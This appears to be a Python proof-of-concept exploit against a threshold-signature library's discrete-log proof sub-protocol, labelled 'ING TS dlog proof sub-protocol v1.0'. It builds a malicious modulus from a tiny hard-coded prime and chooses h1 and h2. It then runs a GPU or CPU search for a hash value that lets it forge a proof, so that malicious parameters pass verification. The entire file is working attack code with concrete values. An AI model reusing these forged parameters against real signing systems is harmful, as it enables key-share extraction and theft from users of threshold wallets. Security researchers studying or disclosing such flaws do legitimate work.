from Crypto.Hash import SHA512
from Crypto.Util.number import isPrime

from sympy import primerange, isprime, discrete_log, is_quad_residue, gcd
from sympy.ntheory.modular import crt
from cuda_run import work
from typing import List, Tuple

import bisect
import random
import time

def _hash_ints(ints: List[int], log=False) -> int:
    hash_obj = SHA512.new(truncate='256')
    full_buf = b''
    for x in ints:
        buf = x.to_bytes((x.bit_length() + 7) // 8, "big")
        hash_obj.update(len(buf).to_bytes(2, "little"))
        hash_obj.update(buf)
        full_buf += len(buf).to_bytes(2, "little")
        full_buf += buf
    if log:
        full_buf = list(full_buf)
        extra = full_buf[128*4:]
        print("full ", len(full_buf), full_buf)
        print("extra", len(extra), extra)
        print(hash_obj.hexdigest())
    return int.from_bytes(hash_obj.digest(), "big")

def _hash_buffer(ints):
    r = b''
    for x in ints:
        buf = x.to_bytes((x.bit_length() + 7) // 8, "big")
        r += len(buf).to_bytes(2, "little")
        r += buf
    return r

def _int_buffer(x):
    return x.to_bytes((x.bit_length() + 7) // 8, "big")


P_LENGTH = 26
Q_LENGTH = 2048 - P_LENGTH
SALT = int.from_bytes(b"ING TS dlog proof sub-protocol v1.0", "big")


def _gen_malicious_params():
    """Search for suitable p, q, h1, h2."""

    # search for p, q
    mask_p = (0b11 << (P_LENGTH - 2)) | 1
    mask_q = (0b11 << (Q_LENGTH - 2)) | 1

    # p = q = 0
    # while not isPrime(p):
    #     p = random.getrandbits(P_LENGTH) | mask_p
    # while not isPrime(q):
    #     q = random.getrandbits(Q_LENGTH) | mask_q
    p = 59399
    q = 272379560429502703646661135106056719719067080873162961823827215490061256422819659552373344951825546324458350620082031068529166308796854290135714817531606786573945775017894758654415070807593192678792937663299335046565532465330588833545771929405703217024587583716414780059599703421685510408057011889147073939499940948444788337443830285948044506503933809432637228751503995389916587635620395123173627949922582932614470156074759502701386357997787786757457957185361386462053568644592955219702419606232499979556498045137552432784518549944634447170594301216051839604055287716430710964545394442374937196964761786349154823
    N = p * q
    phiN = (p - 1) * (q - 1)
    order = phiN // 4

    # search for h1, h2
    # h1 = 2
    # h2 = int(crt([p, q], [1, 2])[0])
    # while True:
    #     try:
    #         assert is_quad_residue(h1, p) and is_quad_residue(h1, q), "inappropriate h1"
    #         secret_q = discrete_log(q, h2, h1)
    #         assert pow(h1, secret_q, q) == h2 % q, "log(h2, base=h1, modulo=q) does not exist"
    #         secret = int(crt([(p - 1) // 2, (q - 1) // 2], [0, secret_q])[0])
    #         k = secret // ((p - 1) // 2)
    #         assert gcd(k, order) == 1, "k has no inverse"
    #         k_inv = pow(k, -1, order)
    #     except Exception as err:
    #         # print(err)
    #         h1 += 1
    #         continue
    #     break

    h1 = 3
    h2 = 13760615392898476588229320545557985480207268925712192831339750926557894674480849200585901386966226600311635873326544209582093481920417078737656312581696774857715740553904043207221049377199608094132619210749882406552490700148501347870732397873576126524082164729353274688610977016863551985815040240639710175423537016715430706807662306046095208468578736052536832796525981847098586007351542361622731684030088889755683032284896850076474038806048238986986775997004457244062946287924836097699366238506865898967194281240349148904273877143202932271058424097434938936796873135434079517928833327228781827190659765446359301657962
    print("h1", h1)
    print("h2", h2)


    # build proof for log(h2, base=h1)
    # g, V = h2, h1
    # secret = p - 1
    # r = 222
    # x = pow(g, r, N)
    # c = _hash_ints([SALT, N, g, V, x])
    # y = (r - c * secret) % phiN
    # proof_dlog_h2_base_h1 = (y, c)

    g, V = h2, h1
    assert g % p == 1 and g % q == 2
    inv_p_mod_q = pow(p, -1, q)

    # sample hash values
    # _hash_ints([SALT, N, g, V], log=True)

    # hash1 = _hash_ints([SALT, N, g, V, pow(g, r, N)])

    r = 0
    hash2 = _hash_ints([SALT, N, g, V, pow(2, r, q)], log=True)
    print("r=", r, hex(hash2))

    r = 1000
    hash2 = _hash_ints([SALT, N, g, V, pow(2, r, q)], log=True)
    print("r=", r, hex(hash2))

    r = 10000
    hash2 = _hash_ints([SALT, N, g, V, pow(2, r, q)], log=True)
    print("r=", r, hex(hash2))

    r = 100000
    hash2 = _hash_ints([SALT, N, g, V, pow(2, r, q)], log=True)
    print("r=", r, hex(hash2))

    # exit(0)

    if True:
        r = work(
            p_buf=_int_buffer(p),
            q_buf=_int_buffer(q),
            p_inv_buf=_int_buffer(inv_p_mod_q),
            max_r = 2**min(P_LENGTH+10, 64),
            threads = 256,
            blocks = 64,
            kernel_batch_size = 1000,
        )
        if r is not None:
            for rr in range(r,r+1):
                # x = pow(2, rr, q)
                x = pow(g, rr, N)
                c = _hash_ints([SALT, N, g, V, x])
                print("salt=", SALT)
                print("N=", N)
                print("g=", g)
                print("v=", V)
                print("x=", x)
                print("H1=", h1)
                print("H2=", h2)
                print("R=", rr)
                print("C=", c)
                print("P=", p)
                print("Q=", q)
                print("N=", N)
                print("c % (p - 1)/2 =", c % ((p - 1) // 2))
        proof_dlog_h2_base_h1 = None
    else:
        # forge proof for log(h1, base=h2)
        g, V = h2, h1
        time_start = time.time()
        for r in range(p):
            c = _hash_ints([SALT, N, g, V, pow(g, r, N)])
            if c % (p - 1) == 0:
                break # Found
            if r%10000==0:
                print("Speed = ", (r+1)/((time.time()-time_start)*1000), "K/s")
        print("Speed = ", (r+1)/((time.time()-time_start)*1000), "K/s")
    y = (r - c // (p - 1)) % phiN
    proof_dlog_h1_base_h2 = (y, c)

    return p, q, h1, h2, proof_dlog_h2_base_h1, proof_dlog_h1_base_h2


p, q, h1, h2, proof_dlog_h2_base_h1, proof_dlog_h1_base_h2 = _gen_malicious_params()
